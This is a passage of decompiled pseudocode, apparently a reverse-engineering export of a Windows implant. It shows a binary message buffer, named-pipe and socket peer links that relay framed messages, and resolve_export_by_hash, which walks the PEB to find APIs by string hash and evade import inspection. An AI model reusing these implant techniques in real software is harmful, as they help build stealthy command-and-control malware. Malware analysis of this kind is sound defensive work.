  puVar1[1] = (char)((uint)param_2 >> 0x10);
  puVar1[2] = (char)((uint)param_2 >> 8);
  puVar1[3] = (char)param_2;
  *param_1 = *param_1 + 4;
  param_1[4] = param_1[4] + 4;
  return;
}



/* binary_buffer_write_uint16 @ 35d44f21a */

void binary_buffer_write_uint16(int *param_1,undefined2 param_2)

{
  uint uVar1;
  longlong lVar2;
  
  FUN_35d44eff6((longlong)param_1,2);
  lVar2 = *(longlong *)(param_1 + 2);
  uVar1 = param_1[4];
  *(undefined1 *)((ulonglong)uVar1 + lVar2) = (char)((ushort)param_2 >> 8);
  ((undefined1 *)((ulonglong)uVar1 + lVar2))[1] = (char)param_2;
  *param_1 = *param_1 + 2;
  param_1[4] = param_1[4] + 2;
  return;
}



/* binary_buffer_write_byte @ 35d44f296 */

void binary_buffer_write_byte(int *param_1,undefined1 param_2)

{
  FUN_35d44eff6((longlong)param_1,1);
  *(undefined1 *)(*(longlong *)(param_1 + 2) + (ulonglong)(uint)param_1[4]) = param_2;
  *param_1 = *param_1 + 1;
  param_1[4] = param_1[4] + 1;
  return;
}



/* binary_buffer_write_bytes @ 35d44f2f6 */

void binary_buffer_write_bytes(int *param_1,undefined8 *param_2,uint param_3)

{
  binary_buffer_write_uint32(param_1,param_3);
  if (param_3 != 0) {
    FUN_35d44eff6((longlong)param_1,param_3);
    memcpy_wrapper((undefined8 *)(*(longlong *)(param_1 + 2) + (ulonglong)(uint)param_1[4]),param_2,
                  (ulonglong)param_3);
    param_1[4] = param_1[4] + param_3;
    *param_1 = param_1[4];
  }
  return;
}



/* binary_buffer_write_string @ 35d44f376 */

void binary_buffer_write_string(int *param_1,undefined8 *param_2)

{
  uint uVar1;
  
  uVar1 = strlen_wrapper((longlong)param_2);
  binary_buffer_write_bytes(param_1,param_2,uVar1);
  return;
}



/* FUN_35d44f3ae @ 35d44f3ae */

void FUN_35d44f3ae(undefined4 *param_1,undefined8 *param_2,uint param_3)

{
  if (param_3 != 0) {
    FUN_35d44eff6((longlong)param_1,param_3);
    memcpy_wrapper((undefined8 *)(*(longlong *)(param_1 + 2) + (ulonglong)(uint)param_1[4]),param_2,
                  (ulonglong)param_3);
    param_1[4] = param_1[4] + param_3;
    *param_1 = param_1[4];
  }
  return;
}



/* binary_buffer_get_data_ptr @ 35d44f420 */

undefined8 binary_buffer_get_data_ptr(longlong param_1)

{
  return *(undefined8 *)(param_1 + 8);
}



/* binary_buffer_get_size @ 35d44f432 */

undefined4 binary_buffer_get_size(longlong param_1)

{
  return *(undefined4 *)(param_1 + 0x10);
}



/* binary_buffer_set_flag @ 35d44f444 */

void binary_buffer_set_flag(undefined4 *param_1,int param_2)

{
  undefined8 uVar1;
  
  if (param_2 == 0) {
    if (*(longlong *)(param_1 + 2) != 0) {
      heap_realloc((longlong *)(param_1 + 2),param_1[1]);
    }
    *(undefined8 *)(param_1 + 2) = 0;
    param_1[1] = 0;
    *param_1 = 0;
    param_1[4] = 0;
  }
  else {
    if (*(longlong *)(param_1 + 2) == 0) {
      param_1[1] = 0x1000;
      uVar1 = heap_alloc(param_1[1]);
      *(undefined8 *)(param_1 + 2) = uVar1;
    }
    else if ((uint)param_1[1] < 0x100001) {
      memset_wrapper(*(ulonglong **)(param_1 + 2),0,(ulonglong)(uint)param_1[1]);
    }
    else {
      heap_realloc((longlong *)(param_1 + 2),param_1[1]);
      param_1[1] = 0x1000;
      uVar1 = heap_alloc(param_1[1]);
      *(undefined8 *)(param_1 + 2) = uVar1;
    }
    param_1[4] = 0;
    *param_1 = 0;
  }
  return;
}



/* binary_reader_read_byte @ 35d44f55c */

undefined4 binary_reader_read_byte(int *param_1)

{
  undefined4 local_c;
  
  local_c = 0;
  if (*param_1 == param_1[4]) {
    local_c = 0;
  }
  else {
    memcpy_wrapper((undefined8 *)&local_c,
                  (undefined8 *)(*(longlong *)(param_1 + 2) + (ulonglong)(uint)param_1[4]),1);
    param_1[4] = param_1[4] + 1;
  }
  return local_c;
}



/* binary_reader_read_uint32 @ 35d44f5c4 */

undefined4 binary_reader_read_uint32(int *param_1)

{
  undefined4 local_c;
  
  local_c = 0;
  if ((uint)(*param_1 - param_1[4]) < 4) {
    local_c = 0;
  }
  else {
    memcpy_wrapper((undefined8 *)&local_c,
                  (undefined8 *)(*(longlong *)(param_1 + 2) + (ulonglong)(uint)param_1[4]),4);
    param_1[4] = param_1[4] + 4;
  }
  return local_c;
}



/* FUN_35d44f62e @ 35d44f62e */

longlong FUN_35d44f62e(int *param_1,uint *param_2)

{
  uint uVar1;
  longlong lVar2;
  
  uVar1 = binary_reader_read_uint32(param_1);
  *param_2 = uVar1;
  if ((uint)(*param_1 - param_1[4]) < *param_2) {
    lVar2 = 0;
  }
  else if (*param_2 == 0) {
    lVar2 = 0;
  }
  else {
    lVar2 = (ulonglong)(uint)param_1[4] + *(longlong *)(param_1 + 2);
    param_1[4] = param_1[4] + *param_2;
  }
  return lVar2;
}



/* binary_reader_read_string @ 35d44f6b6 */

undefined8 * binary_reader_read_string(int *param_1,uint *param_2)

{
  uint uVar1;
  undefined8 *puVar2;
  
  uVar1 = binary_reader_read_uint32(param_1);
  *param_2 = uVar1;
  if ((uint)(*param_1 - param_1[4]) < *param_2) {
    puVar2 = (undefined8 *)0x0;
  }
  else if (*param_2 == 0) {
    puVar2 = (undefined8 *)0x0;
  }
  else {
    puVar2 = (undefined8 *)heap_alloc(*param_2);
    memcpy_wrapper(puVar2,(undefined8 *)(*(longlong *)(param_1 + 2) + (ulonglong)(uint)param_1[4]),
                  (ulonglong)*param_2);
    param_1[4] = param_1[4] + *param_2;
  }
  return puVar2;
}



/* alloc_wrapper_32 @ 35d44f770 */

undefined8 alloc_wrapper_32(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* FUN_35d44f7ae @ 35d44f7ae */

void FUN_35d44f7ae(longlong *param_1,undefined4 param_2,undefined4 param_3,undefined8 param_4,
                  int *param_5)

{
  int iVar1;
  uint uVar2;
  undefined8 uVar3;
  longlong unaff_GS_OFFSET;
  undefined4 local_70;
  undefined4 uStack_6c;
  longlong lStack_68;
  undefined8 local_60;
  uint local_54;
  undefined4 *local_50;
  undefined4 local_44;
  longlong local_40;
  undefined4 local_34;
  longlong local_30;
  undefined4 local_28;
  uint local_24;
  longlong local_20;
  uint local_14;
  
  iVar1 = (**(code **)(g_win32_api_table + 0x110))();
  local_14 = iVar1 + 5000;
  do {
    local_20 = (**(code **)(g_win32_api_table + 0x10))(param_4,0xc0000000,0,0,3,0x100000,0);
    if (local_20 != -1) {
      local_44 = 2;
      iVar1 = (**(code **)(g_win32_api_table + 0x1b8))(local_20,&local_44,0,0);
      if ((iVar1 != 0) && (uVar3 = FUN_35d453a77(local_20,5000), (int)uVar3 != 0)) {
        local_50 = (undefined4 *)0x0;
        local_54 = 0;
        local_24 = FUN_35d453bf2(local_20,(longlong *)&local_50,&local_54);
        if ((4 < local_24) && (local_50 != (undefined4 *)0x0)) {
          local_60 = 0;
          uStack_6c = 1;
          local_70 = param_2;
          lStack_68 = local_20;
          FUN_35d456630(param_1,(undefined8 *)&local_70);
          binary_buffer_write_uint32(param_5,param_2);
          binary_buffer_write_uint32(param_5,param_3);
          binary_buffer_write_byte(param_5,local_70._4_1_);
          binary_buffer_write_uint32(param_5,*local_50);
          binary_buffer_write_bytes(param_5,(undefined8 *)(local_50 + 1),local_24 - 4);
          heap_realloc((longlong *)&local_50,local_54);
          return;
        }
        if ((local_50 != (undefined4 *)0x0) && (local_54 != 0)) {
          heap_realloc((longlong *)&local_50,local_54);
        }
      }
      (**(code **)(g_win32_api_table + 0x40))(local_20);
      (*(code *)*g_syscall_table)(local_20);
      binary_buffer_write_uint32(param_5,param_2);
      binary_buffer_write_uint32(param_5,0x1111ffff);
      local_34 = 0x30;
      local_40 = *(longlong *)(unaff_GS_OFFSET + 0x30);
      binary_buffer_write_uint32(param_5,*(undefined4 *)(local_40 + 0x68));
      return;
    }
    iVar1 = (**(code **)(g_win32_api_table + 0xd0))();
    if (iVar1 == 0xe7) {
      (**(code **)(g_win32_api_table + 0x1f0))(param_4,2000);
    }
    else {
      (**(code **)(g_win32_api_table + 0x1d0))(1000);
    }
    uVar2 = (**(code **)(g_win32_api_table + 0x110))();
  } while (uVar2 < local_14);
  binary_buffer_write_uint32(param_5,param_2);
  binary_buffer_write_uint32(param_5,0x1111ffff);
  local_28 = 0x30;
  local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
  binary_buffer_write_uint32(param_5,*(undefined4 *)(local_30 + 0x68));
  return;
}



/* FUN_35d44fb30 @ 35d44fb30 */

undefined8 FUN_35d44fb30(undefined8 param_1,int param_2)

{
  int iVar1;
  uint uVar2;
  undefined4 local_240 [2];
  undefined8 local_238;
  undefined1 local_29;
  undefined4 local_28;
  undefined4 local_24;
  int local_20;
  int local_1c;
  int local_18;
  uint local_14;
  
  iVar1 = (**(code **)(g_win32_api_table + 0x110))();
  local_14 = iVar1 + param_2;
  while( true ) {
    uVar2 = (**(code **)(g_win32_api_table + 0x110))();
    if (local_14 <= uVar2) {
      return 0;
    }
    local_240[0] = 1;
    local_28 = 0;
    local_24 = 100;
    local_238 = param_1;
    local_18 = (**(code **)(g_win32_api_table + 0x2b8))(0,local_240,0,0,&local_28);
    if (local_18 == 0) {
      return 1;
    }
    if (local_18 == -1) {
      return 0;
    }
    local_1c = (**(code **)(g_win32_api_table + 0x2d0))(param_1,&local_29,1,2);
    if (local_1c == 0) break;
    if (-1 < local_1c) {
      return 1;
    }
    local_20 = (**(code **)(g_win32_api_table + 0x2a8))();
    if (local_20 == 0x2733) {
      return 1;
    }
  }
  return 0;
}



/* FUN_35d44fcac @ 35d44fcac */

void FUN_35d44fcac(longlong *param_1,undefined4 param_2,undefined4 param_3,undefined8 param_4,
                  ushort param_5,int *param_6)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  undefined8 uVar4;
  undefined1 local_210 [16];
  longlong local_200;
  uint local_1f4;
  undefined4 *local_1f0;
  undefined4 local_1e4;
  undefined2 local_1e0;
  undefined2 local_1de;
  undefined8 local_1dc;
  undefined1 local_1d0 [420];
  uint local_2c;
  longlong local_28;
  longlong local_20;
  undefined4 local_14;
  
  local_14 = 0;
  iVar2 = (**(code **)(g_win32_api_table + 0x268))(0x202,local_1d0);
  if (iVar2 == 0) {
    local_20 = (**(code **)(g_win32_api_table + 0x278))(2,1,0);
    if (local_20 == -1) {
      local_14 = (**(code **)(g_win32_api_table + 0x2a8))();
    }
    else {
      local_28 = (**(code **)(g_win32_api_table + 0x280))(param_4);
      if (local_28 == 0) {
        local_14 = 0x43;
      }
      else {
        memcpy_wrapper(&local_1dc,(undefined8 *)**(undefined8 **)(local_28 + 0x18),
                      (longlong)*(short *)(local_28 + 0x12));
        local_1e0 = 2;
        uVar3 = FUN_35d453d81(param_5);
        local_1de = (undefined2)uVar3;
        local_1e4 = 0;
        iVar2 = (**(code **)(g_win32_api_table + 0x288))(local_20,0x8004667e,&local_1e4);
        if (iVar2 == -1) {
          local_14 = (**(code **)(g_win32_api_table + 0x2a8))();
        }
        else {
          iVar2 = (**(code **)(g_win32_api_table + 0x290))(local_20,&local_1e0,0x10);
          if ((iVar2 == -1) && (iVar2 = (**(code **)(g_win32_api_table + 0x2a8))(), iVar2 != 0x2733)) {
            bVar1 = false;
          }
          else {
            bVar1 = true;
          }
          if (bVar1) {
            uVar4 = FUN_35d453e85(local_20,5000);
            if ((int)uVar4 == 0) {
              local_14 = 0x4c9;
            }
            else {
              local_1f0 = (undefined4 *)0x0;
              local_1f4 = 0;
              local_2c = FUN_35d453ffe(local_20,(longlong *)&local_1f0,(int *)&local_1f4);
              if ((4 < local_2c) && (local_1f0 != (undefined4 *)0x0)) {
                local_200 = local_20;
                local_210._4_4_ = 2;
                local_210._0_4_ = param_2;
                local_210._8_8_ = 0;
                FUN_35d456630(param_1,(undefined8 *)local_210);
                binary_buffer_write_uint32(param_6,param_2);
                binary_buffer_write_uint32(param_6,param_3);
                binary_buffer_write_byte(param_6,local_210[4]);
                binary_buffer_write_uint32(param_6,*local_1f0);
                binary_buffer_write_bytes(param_6,(undefined8 *)(local_1f0 + 1),local_2c - 4);
                heap_realloc((longlong *)&local_1f0,local_1f4);
                return;
              }
              if ((local_1f0 != (undefined4 *)0x0) && (local_1f4 != 0)) {
                heap_realloc((longlong *)&local_1f0,local_1f4);
              }
              local_14 = (**(code **)(g_win32_api_table + 0x2a8))();
            }
          }
          else {
            local_14 = (**(code **)(g_win32_api_table + 0x2a8))();
          }
          (**(code **)(g_win32_api_table + 0x2b0))(local_20);
        }
      }
    }
  }
  else {
    local_14 = (**(code **)(g_win32_api_table + 0x2a8))();
    (**(code **)(g_win32_api_table + 0x270))();
  }
  binary_buffer_write_uint32(param_6,param_2);
  binary_buffer_write_uint32(param_6,0x1111ffff);
  binary_buffer_write_uint32(param_6,local_14);
  return;
}



/* FUN_35d4500b4 @ 35d4500b4 */

void FUN_35d4500b4(longlong *param_1,undefined4 param_2,undefined4 param_3,int param_4,int *param_5)

{
  int *piVar1;
  ulonglong uVar2;
  int local_20;
  undefined1 local_1c;
  
  local_1c = 0;
  local_20 = 0;
  do {
    uVar2 = FUN_35d456d30((longlong)param_1);
    if (uVar2 <= (ulonglong)(longlong)local_20) {
LAB_35d4501f0:
      binary_buffer_write_uint32(param_5,param_2);
      binary_buffer_write_uint32(param_5,param_3);
      binary_buffer_write_uint32(param_5,param_4);
      binary_buffer_write_byte(param_5,local_1c);
      return;
    }
    piVar1 = (int *)FUN_35d456750(param_1,(longlong)local_20);
    if (param_4 == *piVar1) {
      if (piVar1[1] == 1) {
        if (*(longlong *)(piVar1 + 2) != 0) {
          (**(code **)(g_win32_api_table + 0x40))(*(undefined8 *)(piVar1 + 2));
          (*(code *)*g_syscall_table)(*(undefined8 *)(piVar1 + 2));
        }
      }
      else if (piVar1[1] == 2) {
        (**(code **)(g_win32_api_table + 0x2c8))(*(undefined8 *)(piVar1 + 4),2);
        (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(piVar1 + 4));
      }
      local_1c = (undefined1)piVar1[1];
      FUN_35d456430(param_1,(longlong)local_20);
      goto LAB_35d4501f0;
    }
    local_20 = local_20 + 1;
  } while( true );
}



/* FUN_35d45023e @ 35d45023e */

void FUN_35d45023e(longlong *param_1,int param_2,longlong param_3,uint param_4)

{
  bool bVar1;
  int iVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  uint local_res20 [2];
  undefined4 local_440 [2];
  undefined8 local_438;
  undefined4 local_230 [2];
  undefined8 local_228;
  undefined4 local_28;
  undefined4 local_24;
  int *local_20;
  int local_14;
  
  if ((param_3 != 0) && (param_4 != 0)) {
    local_20 = (int *)0x0;
    local_res20[0] = param_4;
    for (local_14 = 0; uVar4 = (ulonglong)local_14, uVar3 = FUN_35d456d30((longlong)param_1),
        uVar4 < uVar3; local_14 = local_14 + 1) {
      local_20 = (int *)FUN_35d456750(param_1,(longlong)local_14);
      if (param_2 == *local_20) {
        if (local_20[1] == 1) {
          if (*(longlong *)(local_20 + 2) == 0) {
            return;
          }
          FUN_35d453d2f(*(undefined8 *)(local_20 + 2),param_3,local_res20[0]);
          return;
        }
        if (local_20[1] != 2) {
          return;
        }
        local_28 = 0;
        local_24 = 100;
        local_438 = *(undefined8 *)(local_20 + 4);
        local_230[0] = 1;
        local_440[0] = 1;
        local_228 = local_438;
        (**(code **)(g_win32_api_table + 0x2b8))(0,0,local_230,local_440,&local_28);
        iVar2 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 4),local_440);
        if (iVar2 != 0) {
          return;
        }
        iVar2 = (**(code **)(g_win32_api_table + 0x2c0))(*(undefined8 *)(local_20 + 4),local_230);
        if (iVar2 == 0) {
          return;
        }
        iVar2 = (**(code **)(g_win32_api_table + 0x2e0))(*(undefined8 *)(local_20 + 4),local_res20,4,0);
        if ((iVar2 == -1) && (iVar2 = (**(code **)(g_win32_api_table + 0x2a8))(), iVar2 == 0x2733)) {
          bVar1 = false;
        }
        else {
          bVar1 = true;
        }
        if (!bVar1) {
          return;
        }
        (**(code **)(g_win32_api_table + 0x2e0))(*(undefined8 *)(local_20 + 4),param_3,local_res20[0],0)
        ;
        return;
      }
    }
  }
  return;
}



/* p2p_link_process_queue @ 35d4504f0 */

void p2p_link_process_queue(longlong *param_1,int *param_2)

{
  longlong lVar1;
  undefined8 uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  longlong unaff_GS_OFFSET;
  uint local_6c;
  undefined8 *local_68;
  uint local_5c;
  undefined8 *local_58;
  longlong local_50;
  undefined4 local_44;
  longlong local_40;
  undefined4 local_38;
  uint local_34;
  int local_30;
  uint local_2c;
  undefined4 *local_28;
  int local_1c;
  
  lVar1 = FUN_35d456d30((longlong)param_1);
  if (lVar1 != 0) {
    local_28 = (undefined4 *)0x0;
    for (local_1c = 0; uVar4 = (ulonglong)local_1c, uVar3 = FUN_35d456d30((longlong)param_1),
        uVar4 < uVar3; local_1c = local_1c + 1) {
      local_28 = (undefined4 *)FUN_35d456750(param_1,(longlong)local_1c);
      if (local_28[1] == 1) {
        if (*(longlong *)(local_28 + 2) != 0) {
          uVar2 = FUN_35d453a77(*(undefined8 *)(local_28 + 2),0);
          if ((int)uVar2 == 0) {
            local_38 = 0x30;
            local_40 = *(longlong *)(unaff_GS_OFFSET + 0x30);
            if (*(int *)(local_40 + 0x68) == 0x6d) {
              local_44 = 0x30;
              local_50 = *(longlong *)(unaff_GS_OFFSET + 0x30);
              *(undefined4 *)(local_50 + 0x68) = 0;
              (**(code **)(g_win32_api_table + 0x40))(*(undefined8 *)(local_28 + 2));
              (*(code *)*g_syscall_table)(*(undefined8 *)(local_28 + 2));
              binary_buffer_write_uint32(param_2,0);
              binary_buffer_write_uint32(param_2,0x27);
              binary_buffer_write_uint32(param_2,*local_28);
              binary_buffer_write_byte(param_2,10);
              FUN_35d456430(param_1,(longlong)local_1c);
              local_1c = local_1c + -1;
            }
          }
          else {
            local_58 = (undefined8 *)0x0;
            local_5c = 0;
            local_34 = FUN_35d453bf2(*(undefined8 *)(local_28 + 2),(longlong *)&local_58,&local_5c);
            if (local_34 != 0xffffffff) {
              binary_buffer_write_uint32(param_2,0);
              binary_buffer_write_uint32(param_2,0x25);
              binary_buffer_write_uint32(param_2,*local_28);
              binary_buffer_write_bytes(param_2,local_58,local_34);
            }
            if ((local_58 != (undefined8 *)0x0) && (local_5c != 0)) {
              heap_realloc((longlong *)&local_58,local_34);
            }
          }
        }
      }
      else if (local_28[1] == 2) {
        uVar2 = FUN_35d44fb30(*(undefined8 *)(local_28 + 4),0x9c4);
        if ((int)uVar2 == 0) {
          (**(code **)(g_win32_api_table + 0x2c8))(*(undefined8 *)(local_28 + 4),2);
          (**(code **)(g_win32_api_table + 0x2b0))(*(undefined8 *)(local_28 + 4));
          binary_buffer_write_uint32(param_2,0);
          binary_buffer_write_uint32(param_2,0x27);
          binary_buffer_write_uint32(param_2,*local_28);
          binary_buffer_write_byte(param_2,10);
          FUN_35d456430(param_1,(longlong)local_1c);
          local_1c = local_1c + -1;
        }
        else {
          local_68 = (undefined8 *)0x0;
          local_6c = 0;
          local_2c = 0;
          local_30 = (**(code **)(g_win32_api_table + 0x288))
                               (*(undefined8 *)(local_28 + 4),0x4004667f,&local_6c);
          if ((local_30 != -1) && (3 < local_6c)) {
            local_6c = 0;
            local_2c = FUN_35d453f3b(*(undefined8 *)(local_28 + 4),(longlong)&local_6c,4);
            if ((local_2c == 4) && (local_6c != 0)) {
              local_68 = (undefined8 *)heap_alloc(local_6c);
              local_2c = FUN_35d453f3b(*(undefined8 *)(local_28 + 4),(longlong)local_68,local_6c);
              if (local_2c != 0xffffffff) {
                binary_buffer_write_uint32(param_2,0);
                binary_buffer_write_uint32(param_2,0x25);
                binary_buffer_write_uint32(param_2,*local_28);
                binary_buffer_write_bytes(param_2,local_68,local_2c);
              }
              if ((local_68 != (undefined8 *)0x0) && (local_6c != 0)) {
                heap_realloc((longlong *)&local_68,local_6c);
              }
            }
          }
        }
      }
    }
  }
  return;
}



/* FUN_35d450950 @ 35d450950 */

int FUN_35d450950(byte *param_1)

{
  byte *local_res8;
  uint local_10;
  int local_c;
  
  if (param_1 == (byte *)0x0) {
    local_c = 0;
  }
  else {
    local_c = 0x624;
    local_res8 = param_1;
    while( true ) {
      local_10 = (uint)*local_res8;
      if (local_10 == 0) break;
      if ((0x40 < local_10) && (local_10 < 0x5b)) {
        local_10 = local_10 + 0x20;
      }
      local_c = local_10 + local_c * 0x21;
      local_res8 = local_res8 + 1;
    }
  }
  return local_c;
}



/* FUN_35d4509bd @ 35d4509bd */

int FUN_35d4509bd(ushort *param_1)

{
  ushort *local_res8;
  uint local_10;
  int local_c;
  
  if (param_1 == (ushort *)0x0) {
    local_c = 0;
  }
  else {
    local_c = 0x624;
    local_res8 = param_1;
    while( true ) {
      local_10 = (uint)*local_res8;
      if (local_10 == 0) break;
      if ((0x40 < local_10) && (local_10 < 0x5b)) {
        local_10 = local_10 + 0x20;
      }
      local_c = local_10 + local_c * 0x21;
      local_res8 = local_res8 + 1;
    }
  }
  return local_c;
}



/* FUN_35d450a2a @ 35d450a2a */

undefined8 FUN_35d450a2a(int param_1)

{
  int iVar1;
  undefined8 *puVar2;
  longlong unaff_GS_OFFSET;
  undefined8 *local_10;
  
  puVar2 = (undefined8 *)(*(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x60) + 0x18) + 0x20);
  local_10 = (undefined8 *)*puVar2;
  while( true ) {
    if (local_10 == puVar2) {
      return 0;
    }
    iVar1 = FUN_35d4509bd((ushort *)local_10[10]);
    if (param_1 == iVar1) break;
    local_10 = (undefined8 *)*local_10;
  }
  return local_10[4];
}



/* resolve_export_by_hash @ 35d450ad0 */

undefined8 * resolve_export_by_hash(longlong param_1,int param_2)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  ulonglong local_110 [16];
  int local_8c;
  longlong local_88;
  int local_7c;
  undefined8 *local_78;
  byte *local_70;
  uint local_64;
  undefined8 *local_60;
  uint *local_58;
  longlong local_50;
  uint *local_48;
  longlong local_40;
  longlong local_38;
  undefined8 *local_30;
  int local_28;
  int local_24;
  ushort *local_20;
  uint *local_18;
  
  if ((DAT_35d459090 < 7) && (param_1 != 0)) {
    DAT_35d459090 = DAT_35d459090 + 1;
    local_40 = param_1 + *(int *)(param_1 + 0x3c);
    local_48 = (uint *)(local_40 + 0x88);
    local_50 = param_1 + (ulonglong)*local_48;
    local_58 = (uint *)(param_1 + (ulonglong)*(uint *)(local_50 + 0x1c));
    local_18 = (uint *)(param_1 + (ulonglong)*(uint *)(local_50 + 0x20));
    local_20 = (ushort *)(param_1 + (ulonglong)*(uint *)(local_50 + 0x24));
    local_60 = (undefined8 *)0x0;
    local_64 = 0;
    local_24 = *(int *)(local_50 + 0x18);
    local_38 = param_1;
    while (local_24 != 0) {
      local_70 = (byte *)(local_38 + (ulonglong)*local_18);
      local_24 = local_24 + -1;
      iVar2 = FUN_35d450950(local_70);
      if (param_2 == iVar2) {
        local_58 = (uint *)((longlong)local_58 + (ulonglong)*local_20 * 4);
        local_64 = *local_58;
        local_78 = (undefined8 *)(local_38 + (ulonglong)local_64);
        if ((local_64 <= *local_48) || (local_48[1] + *local_48 <= local_64)) {
          DAT_35d459090 = DAT_35d459090 + -1;
          return local_78;
        }
        local_110[0] = 0;
        local_110[1] = 0;
        local_110[2] = 0;
        local_110[3] = 0;
        local_110[4] = 0;
        local_110[5] = 0;
        local_110[6] = 0;
        local_110[7] = 0;
        local_110[8] = 0;
        local_110[9] = 0;
        local_110[10] = 0;
        local_110[0xb] = 0;
        local_110[0xc] = 0;
        local_110[0xd] = 0;
        local_110[0xe] = 0;
        local_110[0xf] = 0;
        local_60 = local_78;
        local_7c = string_compare((longlong)local_78,'.');
        if (-1 < local_7c) {
          local_7c = local_7c + 1;
          memcpy_wrapper(local_110,local_78,(longlong)local_7c);
          *(undefined1 *)((longlong)local_110 + (longlong)local_7c) = 100;
          *(undefined1 *)((longlong)local_110 + (longlong)(local_7c + 1)) = 0x6c;
          *(undefined1 *)((longlong)local_110 + (longlong)(local_7c + 2)) = 0x6c;
          *(undefined1 *)((longlong)local_110 + (longlong)(local_7c + 3)) = 0;
          iVar2 = strlen_wrapper((longlong)local_78);
          memcpy_wrapper(local_110 + 8,(undefined8 *)((longlong)local_7c + (longlong)local_78),
                        (ulonglong)((iVar2 - local_7c) + 1));
          local_28 = 0;
          uVar3 = strlen_wrapper((longlong)local_110);
          if ((uVar3 < 0xc) ||
             (iVar2 = FUN_35d4549ea((byte *)local_110,(byte *)"api-ms-win-",0xb), iVar2 != 0)) {
            bVar1 = false;
          }
          else {
            bVar1 = true;
          }
          if (bVar1) {
            local_28 = 1;
          }
          else {
            uVar3 = strlen_wrapper((longlong)local_110);
            if ((uVar3 < 8) ||
               (iVar2 = FUN_35d4549ea((byte *)local_110,(byte *)"ext-ms-",7), iVar2 != 0)) {
              bVar1 = false;
            }
            else {
              bVar1 = true;
            }
            if (bVar1) {
              local_28 = 1;
            }
          }
          local_88 = (**(code **)(g_win32_api_table + 0x158))(local_110);
          if (local_88 != 0) {
            local_30 = (undefined8 *)0x0;
            if (local_28 == 0) {
              local_8c = FUN_35d450950((byte *)(local_110 + 8));
              local_30 = resolve_export_by_hash(local_88,local_8c);
            }
            else {
              local_30 = (undefined8 *)(**(code **)(g_win32_api_table + 0xf8))(local_88,local_110 + 8);
            }
            uVar3 = strlen_wrapper((longlong)local_110);
            memset_wrapper(local_110,0,(ulonglong)uVar3);
            uVar3 = strlen_wrapper((longlong)(local_110 + 8));
            memset_wrapper(local_110 + 8,0,(ulonglong)uVar3);
            DAT_35d459090 = DAT_35d459090 + -1;
            return local_30;
          }
          uVar3 = strlen_wrapper((longlong)local_110);
          memset_wrapper(local_110,0,(ulonglong)uVar3);
          uVar3 = strlen_wrapper((longlong)(local_110 + 8));
          memset_wrapper(local_110 + 8,0,(ulonglong)uVar3);
        }
        break;
      }
      local_18 = local_18 + 1;
      local_20 = local_20 + 1;
    }
    DAT_35d459090 = DAT_35d459090 + -1;
  }
  return (undefined8 *)0x0;
}



/* p2p_link_alloc @ 35d4510b0 */

undefined8 p2p_link_alloc(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* FUN_35d4510ee @ 35d4510ee */

void FUN_35d4510ee(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                  undefined4 param_5)

{
  binary_buffer_write_uint32(param_1,param_2);
  binary_buffer_write_uint32(param_1,param_3);
  binary_buffer_write_uint32(param_1,param_4);
  binary_buffer_write_uint32(param_1,param_5);
  return;
}



/* FUN_35d451144 @ 35d451144 */

void FUN_35d451144(int *param_1,undefined4 param_2,undefined4 param_3)

{
  binary_buffer_write_uint32(param_1,param_2);
  binary_buffer_write_uint32(param_1,param_3);
  return;
}



/* FUN_35d451178 @ 35d451178 */

void FUN_35d451178(int *param_1,undefined4 param_2,undefined8 *param_3,uint param_4)

{
  binary_buffer_write_uint32(param_1,param_2);
  binary_buffer_write_uint32(param_1,0x40);
  binary_buffer_write_bytes(param_1,param_3,param_4);
  return;
}



/* FUN_35d4511c8 @ 35d4511c8 */

void FUN_35d4511c8(longlong *param_1,undefined4 param_2,undefined4 param_3,undefined8 param_4,
                  undefined4 param_5,undefined1 param_6,undefined4 param_7,undefined2 param_8,
                  undefined1 param_9)

{
  undefined1 auVar1 [16];
  undefined4 uVar2;
  undefined4 local_50;
  undefined4 uStack_4c;
  undefined8 uStack_48;
  undefined1 local_40 [2];
  undefined1 auStack_3e [14];
  undefined1 local_30 [16];
  undefined1 local_20 [16];
  
  local_30 = (undefined1  [16])0x0;
  local_20 = (undefined1  [16])0x0;
  uStack_4c = param_3;
  local_50 = param_2;
  uStack_48 = param_4;
  _local_40 = SUB1612((undefined1  [16])0x0,0);
  auStack_3e._10_4_ = param_5;
  auVar1 = _local_40;
  local_40[1] = param_6;
  local_40[0] = param_9;
  auStack_3e._2_4_ = param_7;
  auStack_3e._8_6_ = auVar1._10_6_;
  auStack_3e._6_2_ = param_8;
  uVar2 = (**(code **)(g_win32_api_table + 0x110))();
  local_30._0_4_ = uVar2;
  local_30._8_8_ = 0;
  local_20._0_12_ = ZEXT812(0);
  FUN_35d455bb0(param_1,(undefined8 *)&local_50);
  return;
}



/* FUN_35d45128c @ 35d45128c */

longlong FUN_35d45128c(ushort param_1,undefined4 param_2)

{
  int iVar1;
  uint uVar2;
  undefined4 local_1d4;
  undefined8 local_1d0;
  undefined8 local_1c8;
  undefined1 local_1c0 [420];
  int local_1c;
  longlong local_18;
  
  iVar1 = (**(code **)(g_win32_api_table + 0x268))(0x202,local_1c0);
  if (iVar1 < 0) {
    local_18 = -1;
  }
  else {
    local_18 = (**(code **)(g_win32_api_table + 0x278))(2,1,0);
    if (local_18 == -1) {
      local_18 = -1;
    }
    else {
      local_1c8 = 0;
      local_1d0 = 2;
      uVar2 = FUN_35d453d81(param_1);
      local_1d0._0_4_ = CONCAT22((short)uVar2,(undefined2)local_1d0);
      local_1d4 = 1;
      local_1c = (**(code **)(g_win32_api_table + 0x288))(local_18,0x8004667e,&local_1d4);
      if (((local_1c == -1) ||
          (local_1c = (**(code **)(g_win32_api_table + 0x300))(local_18,&local_1d0,0x10), local_1c == -1
          )) || (local_1c = (**(code **)(g_win32_api_table + 0x2f8))(local_18,param_2), local_1c == -1))
      {
        (**(code **)(g_win32_api_table + 0x2b0))(local_18);
        local_18 = -1;
      }
    }
  }
  return local_18;
}



